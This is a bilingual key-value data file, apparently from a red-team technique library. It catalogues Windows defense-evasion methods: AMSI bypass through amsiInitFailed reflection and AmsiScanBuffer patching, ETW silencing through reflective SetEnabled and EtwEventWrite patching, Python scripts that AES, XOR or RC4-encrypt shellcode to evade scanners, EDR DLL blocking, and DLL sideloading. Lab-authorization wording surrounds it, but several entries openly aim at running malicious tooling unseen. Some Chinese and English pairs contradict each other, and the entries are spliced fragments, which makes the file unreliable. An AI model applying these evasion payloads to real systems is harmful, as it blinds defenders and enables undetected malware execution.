name.zh: AMSI 完整性与事件审计

description.zh: 测试 AMSI 初始化与扫描完整性（amsiInitFailed、内存补丁），验证 EDR 捕获边界。
description.en: AMSI Integrity and Event Audit preserves the original reproducible technique commands while restricting execution to a written, reversible, isolated lab authorization. Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

category.zh: 终端防护与遥测完整性

prerequisites.zh: 确认 AMSI 完整性与事件审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for AMSI Integrity and Event Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

description.zh: 通过反射设置 amsiInitFailed 禁用 AMSI；成功时命令无报错且后续含已知签名的脚本不再被拦截。
description.en: Disable AMSI by reflecting amsiInitFailed; the command completing without error and subsequent known-signature scripts no longer blocked confirms success.

description.zh: 以混淆方式定位并翻转标志位；成功时脚本执行完成且 AMSI 扫描不再触发拦截。
description.en: Locate and flip the flag via obfuscated code; the script completing with no further AMSI blocks confirms success.

title.zh: AMSI 完整性与事件审计校正命令 3
title.en: AMSI Integrity and Event Audit Reviewed Command 3

description.zh: 在隔离授权环境运行并关联 PAYLOADER_EVASION_AMSI_BYPASS_E_3 与蓝队日志；成功时列出 AV 产品 displayName 与 productState，用于核对防护基线。
description.en: Run in the isolated authorization and correlate PAYLOADER_EVASION_AMSI_BYPASS_E_3 with blue-team logs; AV products listed with displayName and productState for the protection baseline confirms success.

description.zh: 加载现成 AmsiBypass 脚本执行；成功时调用无报错且标记脚本可通过 AMSI 扫描。
description.en: Load and run the ready-made AmsiBypass script; the call completing without error and marker scripts passing AMSI scanning confirms success.

analysis.zh: AMSI 完整性与事件审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: AMSI Integrity and Event Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 一次只查询一个实验对象并限制结果数量，不保存凭据、哈希、票据、邮箱正文或无关个人数据。
opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

title.zh: 大小写与反射变形规避变体

description.zh: 绕过对 AmsiUtils/amsiInitFailed 完整字符串的特征匹配：运行期拼接类型名。成功判据：后续恶意脚本无 AMSI 拦截事件。
description.en: Evades signature matching on the full AmsiUtils/amsiInitFailed string by assembling the type name at runtime. Success: subsequent malicious scripts raise no AMSI interception events.

description.zh: 绕过 amsiInitFailed 单点检测：直接修补 AmsiScanBuffer 返回成功。成功判据：AMSI 扫描函数被钝化且脚本执行。
description.en: Evades the single-point amsiInitFailed check by patching AmsiScanBuffer to return success directly. Success: the scan function is neutralized and scripts execute.

title.zh: 无 PowerShell 进程规避变体

description.zh: 绕过基于 powershell.exe 的 AMSI 上下文：在自建 .NET 程序集内执行，AMSI 需另路覆盖。成功判据：程序集动作完成且 powershell AMSI 无记录。
description.en: Evades powershell.exe-scoped AMSI context by executing inside a custom .NET assembly that AMSI does not cover. Success: the assembly's actions complete with no PowerShell AMSI records.

description.zh: 用 Get-CimInstance 查 root/SecurityCenter2 的 AntiVirusProduct；产品名与版本即确定要绕过的防护组合。
description.en: Query AntiVirusProduct in root/SecurityCenter2 with Get-CimInstance; product names and versions define which protections must be bypassed.

title.zh: 反射置空 AMSI 标志
title.en: Flip the AMSI flag via reflection

description.zh: 反射读取 AmsiUtils.amsiInitFailed 并置 true；随后加载脚本不再触发 AMSI 拦截即扫描链路被断开。
description.en: Reflect AmsiUtils.amsiInitFailed and set it true; scripts loading without AMSI errors means the scanning chain is severed.

description.zh: 改用 GetTypes 遍历匹配 *iUtils 再取字段赋值；效果等价而语句不固定即绕过针对经典写法的检测规则。
description.en: Switch to a GetTypes walk matching *iUtils and set the field; identical effect with non-fixed syntax dodges rules keyed on the classic form.

description.zh: Import-Module 加载 AmsiBypass.ps1 后再导入攻击模块；全程无 AMSI 告警即建立后续利用的干净执行环境。
description.en: Import AmsiBypass.ps1 then load offensive modules; no AMSI alerts throughout establishes a clean environment for follow-on tooling.

overview.zh: AMSI 完整性与事件审计覆盖反恶意软件扫描接口失效场景：针对部署 AMSI 与脚本遥测的 Windows 终端，验证反射置位与内存修补等变体能否使 AMSI 停止拦截。验证维度涵盖反射设置 amsiInitFailed、混淆标志翻转、防护产品基线查询与现成工具加载四类。
overview.en: AMSI Integrity and Event Audit covers antimalware scan interface neutralization: on Windows endpoints with AMSI and script telemetry deployed, verify whether reflection-based flag setting and in-memory patching variants silence AMSI. Verification dimensions cover reflection on amsiInitFailed, obfuscated flag flips, AV product baseline queries, and ready-made tool loading.

vulnerability.zh: 根因是 AMSI 在 PowerShell 进程内以 amsiInitFailed 静态标志判定可用性，脚本持有反射访问时即可置位让扫描静默跳过；其完整性依赖进程内内存保护与脚本遥测的同步告警，任一缺失即形成静默失效窗口。
vulnerability.en: The root cause is that AMSI relies on the amsiInitFailed static flag inside the PowerShell process to judge availability, so scripts with reflective access can set it and silently skip scanning; its integrity depends on in-process memory protection and synchronized script telemetry, and either gap creates a silent failure window.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用反射将 amsiInitFailed 置为 true，后续含已知签名的脚本不再被拦截即确认成功；第 2 步用混淆字段遍历版本复现同样效果并对比遥测差异；第 3 步查询 root/SecurityCenter2 获取 AV 产品与 productState，记录防护基线用于解释拦截行为；第 4 步加载 Invoke-AmsiBypass 验证工具链，标记脚本通过扫描即确认。LAB_* 占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 sets amsiInitFailed to true via reflection — known-signature scripts no longer blocked confirms success; step 2 replays with an obfuscated field-walk version and compares telemetry; step 3 queries root/SecurityCenter2 for AV products and productState to record the protection baseline explaining interception behavior; step 4 loads Invoke-AmsiBypass to validate the toolchain — a flagged script passing the scan confirms. Replace LAB_* placeholders via the global variables menu.

mitigation.zh: 启用脚本块日志并对 amsiInitFailed 反射访问与 Amsi* API 调用建立检测规则，开启防篡改保护与完整性监控，并为 PowerShell 启用约束语言模式（Constrained Language Mode）；对 AMSI 中断事件实时告警。修复后用第 1 步样例回归，反射置位应被阻断或立即告警。
mitigation.en: Enable script-block logging with detections for amsiInitFailed reflection and Amsi* API calls, turn on tamper protection and integrity monitoring, and deploy constrained language mode for PowerShell; alert in real time on AMSI interruption. After the fix, regress with the step 1 sample: the reflective set must be blocked or alerted immediately.

name.zh: ETW 提供程序完整性审计

description.zh: 验证 ETW 提供程序完整性（providerguid 补丁、禁用痕迹），验证遥测绕过面。
description.en: ETW Provider Integrity Audit preserves the original reproducible technique commands while restricting execution to a written, reversible, isolated lab authorization. Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

category.zh: 终端防护与遥测完整性

prerequisites.zh: 确认 ETW 提供程序完整性审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for ETW Provider Integrity Audit are authorized in writing and reversible.

prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

title.zh: ETW 提供程序完整性审计校正命令 1
title.en: ETW Provider Integrity Audit Reviewed Command 1

description.zh: 在隔离授权环境运行并关联 PAYLOADER_EVASION_ETW_PATCH_E_1 与蓝队日志；成功时脚本执行无报错且对应 provider 事件流中断。
description.en: Run in the isolated authorization and correlate PAYLOADER_EVASION_ETW_PATCH_E_1 with blue-team logs; the script completing without error and the provider event stream stopping confirms success.

execution.command:
Assembly.Load("System.Diagnostics.Tracing")
Type etwType = typeof(EventProvider)
MethodInfo setEnabled = etwType.GetMethod("SetEnabled", BindingFlags.NonPublic | BindingFlags.Static)
setEnabled.Invoke(null, new object[] { Guid.NewGuid(), 0, 0 })

description.zh: 以反射调用 SetEnabled 关闭 ETW provider；成功时 provider 状态变为禁用且事件不再产出。
description.en: Disable the ETW provider via reflective SetEnabled; the provider state becoming disabled with no further events confirms success.

description.zh: 修补 ntdll 导出的 EtwEventWrite；成功时函数首字节变为返回指令且 ETW 遥测停止记录。
description.en: Patch the ntdll-exported EtwEventWrite; the first byte becoming a return instruction with ETW telemetry stopping confirms success.

analysis.zh: ETW 提供程序完整性审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: ETW Provider Integrity Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 一次只查询一个实验对象并限制结果数量，不保存凭据、哈希、票据、邮箱正文或无关个人数据。
opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

description.zh: 绕过 ETL 会话与 .NET 提供程序监控：将 ntdll!EtwEventWrite 首字节补丁为 RET，事件不再下发。成功判据：操作期间事件通道无新增记录。
description.en: Evades ETL sessions and .NET providers by patching the first byte of ntdll!EtwEventWrite to RET so events stop flowing. Success: no new records in the event channels during the operation.

title.zh: COMPlus 环境禁用规避变体

description.zh: 绕过 .NET 运行时事件（CLR/JIT/Loader 日志）：环境变量关闭 CLR ETW 提供程序。成功判据：DotNETRuntime 通道无新事件且命令执行。
description.en: Evades .NET runtime events (CLR/JIT/Loader logs) by disabling the CLR ETW provider via environment variable. Success: no new DotNETRuntime events while the command executes.

description.zh: 绕过目标提供程序的事件上报：反注册/禁用句柄使遥测静默。成功判据：操作后相关通道静默。
description.en: Evades provider event reporting by deregistering/disabling handles to silence telemetry. Success: the relevant channels go quiet afterwards.

title.zh: 反射关闭 ETW 提供程序

description.zh: 调用 EventProvider.SetEnabled 传入新建随机 GUID 与零级别；对应 provider 事件流停止输出即托管遥测出现盲区。
description.en: Call EventProvider.SetEnabled with an empty GUID and zero levels; the .NET runtime event stream going silent opens a telemetry blind spot.

description.zh: 用 Assembly.Load 加载后反射 Invoke SetEnabled(null)；托管日志同步静默即获得不依赖 PowerShell 的第二实现。
description.en: Load via Assembly.Load and reflectively Invoke SetEnabled(null); managed logs going quiet yields a second implementation free of PowerShell.

attackChain.payload:
Assembly.Load("System.Diagnostics.Tracing")
Type etwType = typeof(EventProvider)
MethodInfo setEnabled = etwType.GetMethod("SetEnabled", BindingFlags.NonPublic | BindingFlags.Static)
setEnabled.Invoke(null, new object[] { Guid.NewGuid(), 0, 0 })

title.zh: 内存补丁拦截事件写入

description.zh: 定位 ntdll!EtwEventWrite 并用 VirtualProtect 改写为直接返回；依赖 ETW 的探针全部失明即纵深致盲完成。
description.en: Locate ntdll!EtwEventWrite, VirtualProtect and patch it to return immediately; every ETW-dependent sensor going blind completes deep blinding.

overview.zh: ETW 提供程序完整性审计覆盖遥测静默场景：针对部署 ETW 事件采集与 EDR 的终端，验证托管 API、反射调用与内存修补三类变体能否中断提供程序事件流。验证维度涵盖托管 SetEnabled 关闭、C# 反射禁用与 ntdll!EtwEventWrite 修补。
overview.en: ETW Provider Integrity Audit covers telemetry silencing: on endpoints with ETW collection and EDR deployed, verify whether managed-API, reflection, and in-memory patching variants can interrupt provider event streams. Verification dimensions cover managed SetEnabled shutdown, C# reflection disabling, and ntdll!EtwEventWrite patching.

vulnerability.zh: 根因是 ETW 事件流在进程内存在两个中断点：EventProvider.SetEnabled 托管入口可关闭 provider，而 ntdll!EtwEventWrite 首字节被改写为 ret 后所有遥测写入静默返回；依赖单一 ETW 源的检测随之失明。
vulnerability.en: The root cause is two in-process interruption points for ETW streams: the managed EventProvider.SetEnabled entry can disable a provider, and once ntdll!EtwEventWrite's first byte is rewritten to ret, all telemetry writes silently return; detection relying on a single ETW source goes blind.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用 PowerShell 托管 EventProvider 实例调用 SetEnabled(0)，对应 provider 事件流中断即确认成功；第 2 步用 C# 反射调用非公开 SetEnabled 复现并对比遥测差异；第 3 步用 VirtualProtect+WriteProcessMemory 把 ntdll!EtwEventWrite 首字节改为 0xC3，ETW 遥测停止记录即确认修补生效，同时记录 EDR 是否对内存修改产生告警。LAB_* 占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 calls SetEnabled(0) on a managed EventProvider instance in PowerShell — the provider's stream stops confirms success; step 2 replays with C# reflection on the non-public SetEnabled and compares telemetry; step 3 rewrites ntdll!EtwEventWrite's first byte to 0xC3 via VirtualProtect+WriteProcessMemory — ETW telemetry halting confirms the patch, while noting whether the EDR alerts on the memory modification. Replace LAB_* placeholders via the global variables menu.

mitigation.zh: 启用防篡改与内存完整性保护，监控 VirtualProtect/WriteProcessMemory 对 ntdll 区域的写访问与 provider 异常停止事件；以内核回调、安全产品与 ETW 多源交叉校验。修复后用第 1、3 步样例回归，关闭与修补均应被阻断或产生告警。
mitigation.en: Enable tamper protection and memory integrity, monitor VirtualProtect/WriteProcessMemory writes into ntdll regions plus abnormal provider stop events, and cross-validate with kernel callbacks, security products, and ETW multi-source collection. After the fix, regress with the step 1 and step 3 samples: both shutdown and patching must be blocked or alerted.

An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

description.en: Evades monitoring of long-lived policy anomalies by saving the policy before the operation and restoring immediately after, minimizing the anomaly window. Success: loads complete inside the window and the final policy matches the original.

description.en: Check the target's DLL signature policy with Get-ProcessMitigation; the enforced SignatureLevel is the bar for loading non-Microsoft DLLs.

title.zh: 比对父子进程策略差异

description.zh: 对宿主与其子进程分别读取签名策略并比对差异；子进程继承不全或仅告警不强制即存在加载未签名 DLL 的利用窗口。
description.en: Read the policy for host and child separately; incomplete inheritance or audit-only enforcement leaves a window for unsigned modules.

title.zh: 重设签名策略放行载荷
title.en: Relax the policy for payload DLLs

description.zh: P/Invoke SetProcessMitigationPolicy 把签名级别收紧为仅允许微软签名；随后安全产品的用户态注入 DLL 被拒载、进程内监控静默即策略被武器化，终端形成检测盲区。
description.en: Lower the signature level via P/Invoke SetProcessMitigationPolicy; the custom DLL loading cleanly shows the policy was rewritten under attacker control.

overview.zh: 进程模块签名策略审计覆盖进程缓解策略场景：针对安全产品依赖 DLL 注入实现监控的机制，验证签名策略能否阻止未签名 DLL 进入目标进程。验证维度涵盖 Get-ProcessMitigation 策略读取、多来源一致性核对与 C# SetProcessMitigationPolicy 设置三类。
overview.en: Process Module-Signature Policy Audit covers process mitigation policy: given security products that monitor via DLL injection, verify whether a signature policy can stop unsigned DLLs from entering the target process. Verification dimensions cover Get-ProcessMitigation policy reads, multi-source consistency checks, and C# SetProcessMitigationPolicy configuration.

vulnerability.zh: 根因是 Windows 允许为进程设置 ProcessSignaturePolicy（仅 Microsoft 签名可载入），而 EDR 常以用户态 DLL 注入实现监控；策略生效后未签名的安全产品 DLL 被拒载，进程内遥测随之静默，形成检测盲区。
vulnerability.en: The root cause is that Windows lets a process set ProcessSignaturePolicy (Microsoft-signed DLLs only), while EDRs commonly monitor via user-mode DLL injection; once the policy is active, unsigned security-product DLLs are refused and in-process telemetry falls silent, creating a detection blind spot.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用 Get-ProcessMitigation 读取实验进程的缓解策略明细；第 2 步重复读取并核对两次输出一致，确认策略读取稳定；第 3 步以 C# 调用 SetProcessMitigationPolicy 设置 SignatureLevel=0x0F，未签名 DLL 加载被拒即确认策略生效，同时观察安全产品监控是否因此中断。LAB_* 占位符在全局变量菜单中替换为目标值。
exploitation.en: Use in Payload list order: step 1 reads the lab process's mitigation details with Get-ProcessMitigation; step 2 repeats the read for multi-source consistency; step 3 sets SignatureLevel=0x0F via C# SetProcessMitigationPolicy — unsigned DLL loads refused confirms the policy took effect, while observing whether security-product monitoring breaks. Replace LAB_* placeholders via the global variables menu.

mitigation.zh: 为安全产品进程预配置签名策略豁免并启用防篡改保护，监控 SetProcessMitigationPolicy 调用与安全产品 DLL 加载失败事件；EDR 补充内核回调数据源避免单点失明。修复后用第 3 步样例回归，策略设置应被阻断或立即告警。
mitigation.en: Pre-configure signature-policy exemptions for security-product processes and enable tamper protection; monitor SetProcessMitigationPolicy calls and security-product DLL load failures, and give EDRs kernel-callback data sources to avoid single-point blindness. After the fix, regress with the step 3 sample: policy setting must be blocked or alerted immediately.

title.zh: AES-CBC 加密变形规避变体

wafBypass.command:
python3 - <<'PY'
from Crypto.Cipher import AES
from os import urandom
key=urandom(32); iv=urandom(16)
sc=open('{LAB_SHELLCODE_FILE}','rb').read()
sc+=b'\x90'*((-len(sc))%16)
open('{LAB_ENCODED_FILE}','wb').write(iv+AES.new(key,AES.MODE_CBC,iv).encrypt(sc))
print(key.hex())
PY

description.zh: 绕过静态熵分析与 XOR 特征扫描：AES-CBC 加密使载荷熵呈随机分布。成功判据：{LAB_ENCODED_FILE} 熵接近 7.99 且解密后可执行。
description.en: Evades static entropy analysis and XOR signature scanning since AES-CBC ciphertext presents near-random entropy. Success: {LAB_ENCODED_FILE} entropy approaches 7.99 and decrypts to executable shellcode.

title.zh: 多轮滚动异或规避变体

wafBypass.command:
python3 - <<'PY'
sc=bytearray(open('{LAB_SHELLCODE_FILE}','rb').read())
keys=[b'k1!',b'k2@',b'k3#']
for k in keys:
    for i in range(len(sc)): sc[i]^=k[i%len(k)]
open('{LAB_ENCODED_FILE}','wb').write(sc)
PY

description.zh: 绕过单字节/单密钥 XOR 的已知明文破解：三轮不同长密钥滚动异或。成功判据：三轮逆序解密还原 shellcode。
description.en: Evades known-plaintext recovery against single-key XOR by rolling three different-length keys. Success: reverse-order decryption restores the shellcode.

title.zh: RC4 密钥派生变形规避变体

wafBypass.command:
python3 - <<'PY'
from Crypto.Cipher import ARC4
from hashlib import sha256
key=sha256(b'{LAB_RC4_SEED}').digest()
open('{LAB_ENCODED_FILE}','wb').write(ARC4.new(key).encrypt(open('{LAB_SHELLCODE_FILE}','rb').read()))
PY

description.zh: 绕过对固定密钥 RC4 流的特征还原：以种子派生密钥且每次不同。成功判据：派生密钥解密成功。
description.en: Evades signature recovery against fixed-key RC4 streams by deriving the key from a seed each run. Success: the derived key decrypts successfully.

title.zh: 编码 shellcode 摆脱签名
title.en: Encode shellcode off the signature list

description.zh: 用 shellcode_encoder.py 以随机密钥加工原始 shellcode；产物哈希改变且功能可还原即脱离静态特征库。
description.en: Process the shellcode with shellcode_encoder.py under a random key; a changed hash with recoverable function escapes static signatures.

title.zh: 异或轮转密钥落地实现
title.en: Implement XOR with a rotating key

description.zh: 按 key[i % len] 对字节流逐位异或；加载器内嵌同一密钥在内存还原后跳转执行即运行时等价。
description.en: XOR each byte with key[i % len]; the loader embedding the same key restores and jumps to it in memory, runtime-equivalent to the original.

attackChain.payload:
key = b"randomkey"
encrypted = bytearray()
for i in range(len(shellcode)):
    encrypted.append(shellcode[i] ^ key[i % len(key)])

title.zh: 换用 RC4 加密变体

description.zh: 用 ARC4.new(key).encrypt 处理 shellcode；密文分布接近随机即进一步压低熵扫描与特征命中率。
description.en: Encrypt with ARC4.new(key).encrypt; near-random ciphertext further lowers entropy scanning and signature hit rates.

attackChain.payload:
from Crypto.Cipher import ARC4
cipher = ARC4.new(key)
encrypted = cipher.encrypt(shellcode)

description.zh: 对编码产物用 Get-FileHash 计算 SHA256；哈希与基准一致即确认投递过程中载荷未被篡改，加载器可按预置密钥在内存解密。
description.en: Hash the encoded artifact with SHA256; matching the loader's built-in value guarantees correct decryption and execution after delivery.

overview.zh: 编码内存载荷检测回归覆盖载荷编码与静态检测对抗场景：针对静态特征扫描机制，验证 XOR 与 RC4 编码对检出率的影响。验证维度涵盖编码器脚本调用、XOR 循环参考实现、RC4 加密实现与不可执行夹具哈希基线四类步骤。
overview.en: Encoded In-Memory Payload Detection Regression covers payload encoding versus static detection: against signature-based scanning, verify how XOR and RC4 encoding affect detection rates. Verification dimensions cover encoder script invocation, an XOR-loop reference implementation, RC4 encryption, and a hash baseline over a non-executable byte fixture.

vulnerability.zh: 根因是静态检测依赖明文字节特征与熵值阈值，XOR/RC4 编码使载荷不再命中已知签名；高熵本身并不必然判恶，检测需要同时覆盖熵、导入表与内存行为，任一维度缺失即形成编码绕过窗口。
vulnerability.en: The root cause is that static detection depends on plaintext byte signatures and entropy thresholds, and XOR/RC4 encoding stops payloads matching known signatures; high entropy alone is not proof of malice, so detection must jointly cover entropy, import tables, and memory behavior — any missing dimension opens an encoding bypass window.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步运行 shellcode_encoder.py 对夹具文件编码，输出文件可逆解码一致即确认工具链；第 2 步用 XOR 循环参考实现复现并比对输出一致；第 3 步用 PyCryptodome ARC4 复现 RC4 加密并比对参考密文；第 4 步对不可执行字节夹具计算 SHA256，作为非执行完整性基线。全程仅使用无执行语义的字节夹具；LAB_* 占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 encodes the fixture file with shellcode_encoder.py — a reversible-decode match on the output confirms the toolchain; step 2 replays with the XOR-loop reference and matches output; step 3 replays RC4 with PyCryptodome ARC4 and matches the reference ciphertext; step 4 computes the SHA256 of the non-executable byte fixture as the integrity baseline. Use only byte fixtures with no execution semantics throughout; replace LAB_* placeholders via the global variables menu.

mitigation.zh: 检测侧引入熵值、导入表与内存行为多维规则，对加密载荷落盘与可疑解码链建立告警，并启用内存扫描覆盖解码后形态。修复后用第 1-3 步样例回归，编码文件应触发熵或行为类告警。
mitigation.en: Add multi-dimensional rules over entropy, import tables, and memory behavior, alert on encrypted payload drops and suspicious decode chains, and enable memory scanning to cover post-decode forms. After the fix, regress with the step 1-3 samples: encoded files must trigger entropy or behavior alerts.

description.zh: 在隔离授权环境运行并关联 PAYLOADER_EVASION_EVASION_DLL_SIDELOADING_E_2 与蓝队日志；成功时重复输出签名状态，用于多来源核对。
description.en: Run in the isolated authorization and correlate PAYLOADER_EVASION_EVASION_DLL_SIDELOADING_E_2 with blue-team logs; the signature status repeated for multi-source verification confirms success.

explanation.zh: 校验 {LAB_APPLICATION_BINARY} 的 Authenticode 签名
输出签名状态（Valid/NotSigned/HASH_MISMATCH 等）、状态消息与签名证书，用于核对二进制是否被篡改或冒用
explanation.en: Prints the signature status (Valid, NotSigned, HASH_MISMATCH, ...), status message, and signer certificate to check whether the binary was tampered with or impersonated

title.zh: DLL 侧加载搜索顺序检测校正命令 3
title.en: DLL Sideloading Search-Order Detection Reviewed Command 3

description.zh: 在隔离授权环境运行并关联 PAYLOADER_EVASION_EVASION_DLL_SIDELOADING_E_3 与蓝队日志；成功时确认签名缺失或不受信，标记侧加载候选。
description.en: Run in the isolated authorization and correlate PAYLOADER_EVASION_EVASION_DLL_SIDELOADING_E_3 with blue-team logs; missing or untrusted signature confirmed, marking a sideloading candidate, confirms success.

analysis.zh: DLL 侧加载搜索顺序检测只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: DLL Sideloading Search-Order Detection is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 一次只查询一个实验对象并限制结果数量，不保存凭据、哈希、票据、邮箱正文或无关个人数据。
opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

title.zh: 当前目录优先规避变体

description.zh: 绕过应用目录监控：DLL 置于当前目录利用搜索顺序优先加载。成功判据：代理 DLL 被应用加载执行。
description.en: Evades application-directory monitoring by placing the DLL in the current directory to win the search order. Success: the proxy DLL loads and executes in the application.

description.zh: 绕过根目录 DLL 扫描：利用清单/SxS 的语言子目录搜索加载代理。成功判据：子目录 DLL 被加载。
description.en: Evades root-directory DLL scanning by exploiting manifest/SxS language-subfolder probing. Success: the subfolder DLL loads.

title.zh: COM CLSID 劫持规避变体

description.zh: 绕过文件系统级侧加载检测：经 HKCU CLSID 注册表劫持让系统加载指定 DLL。成功判据：触发 COM 激活时代理 DLL 加载。
description.en: Evades filesystem-level sideload detection by hijacking an HKCU CLSID so the system loads the designated DLL on COM activation. Success: the proxy DLL loads when the COM class activates.

description.zh: 对宿主程序运行 Get-AuthenticodeSignature；Status 为 Valid 即主程序签名完整，替换依赖不会破坏其签名态。
description.en: Run Get-AuthenticodeSignature on the host binary; a Valid status means swapping dependencies leaves the signed state intact.

description.zh: 对同目录依赖 DLL 逐一验签；存在 NotSigned 或 Unknown 状态的模块即缺少校验的可替换缺口。
description.en: Verify each dependency DLL in turn; NotSigned or Unknown modules are unchecked replacement gaps.

title.zh: 投放同名 DLL 劫持加载
title.en: Drop a DLL to hijack the load

description.zh: 把载荷 DLL 以目标模块名放入搜索顺序前列后启动宿主程序；载荷随签名进程加载并执行即侧加载接管完成，EDR 视角全程合法。
description.en: Name the payload DLL after the target module and place it earlier in the search order, then start the host; loading inside the signed process completes the sideload takeover.

overview.zh: DLL 侧加载搜索顺序检测覆盖 DLL 搜索顺序劫持场景：针对签名应用加载非签名依赖的行为，验证侧加载候选点与签名状态能否被系统枚举。验证维度涵盖应用二进制签名读取、多来源签名核对与签名缺失候选标记三类步骤。
overview.en: DLL Sideloading Search-Order Detection covers DLL search-order hijacking: for signed applications loading unsigned dependencies, verify whether sideloading candidates and signature states can be enumerated systematically. Verification dimensions cover application binary signature reads, multi-source signature checks, and flagging signature-missing candidates.

vulnerability.zh: 根因是 Windows DLL 搜索顺序优先应用目录，签名应用加载同名单名 DLL 时不校验该 DLL 自身签名；攻击者把恶意 DLL 放入应用目录即可借签名宿主进程执行，使仅校验主进程签名的可信度评估失效。
vulnerability.en: The root cause is the Windows DLL search order preferring the application directory and signed apps not validating the loaded same-name DLL's own signature; placing a malicious DLL in the application directory executes it under the signed host process, defeating trust assessments that check only the main process signature.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用 Get-AuthenticodeSignature 读取应用二进制的签名状态与签名者信息，Status 为 Valid 即确认宿主签名完整；第 2 步重复读取核对两次输出一致；第 3 步把 {LAB_APPLICATION_BINARY} 依次替换为同目录依赖 DLL 复验，NotSigned/Unknown 的依赖即定位可替换缺口，再核对应用目录 ACL 确认可写后标记为侧加载候选点。LAB_* 占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 reads the application binary's signature status and signer with Get-AuthenticodeSignature; step 2 repeats the read for multi-source checks; step 3 outputs again and flags binaries whose signature is missing or untrusted as sideloading candidate hosts, then inspects application-directory ACLs and missing-DLL lists to locate writable injection points. Replace LAB_* placeholders via the global variables menu.

mitigation.zh: 为应用目录配置仅管理员可写 ACL，启用依赖库签名强制并移除多余 DLL；用 Sysmon 事件 7 监控来自异常路径的模块加载。修复后用第 3 步样例回归，侧加载候选点应被 ACL 或签名策略阻断。
mitigation.en: Configure application directories as administrator-writable only, enforce dependency signature checks, and remove surplus DLLs; monitor module loads from abnormal paths with Sysmon event 7. After the fix, regress with the step 3 sample: sideloading candidates must be blocked by ACLs or signature policy.

name.zh: 进程参数多源遥测审计

description.zh: 验证进程参数欺骗后多源遥测（PEB/命令行）的差异检测。
description.en: Process-Argument Multi-Source Telemetry Audit preserves the original reproducible technique commands while restricting execution to a written, reversible, isolated lab authorization. Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

category.zh: 终端防护与遥测完整性

subCategory.zh: 进程伪装与内存载荷规避

prerequisites.zh: 确认 进程参数多源遥测审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for Process-Argument Multi-Source Telemetry Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

description.zh: 在隔离授权环境运行并关联 PAYLOADER_EVASION_EVASION_ARG_SPOOFING_E_1 与蓝队日志；成功时进程以不一致的应用名与命令行创建，多源遥测记录存在差异。
description.en: Run in the isolated authorization and correlate PAYLOADER_EVASION_EVASION_ARG_SPOOFING_E_1 with blue-team logs; the process created with inconsistent application name and command line, recorded differently across telemetry sources, confirms success.

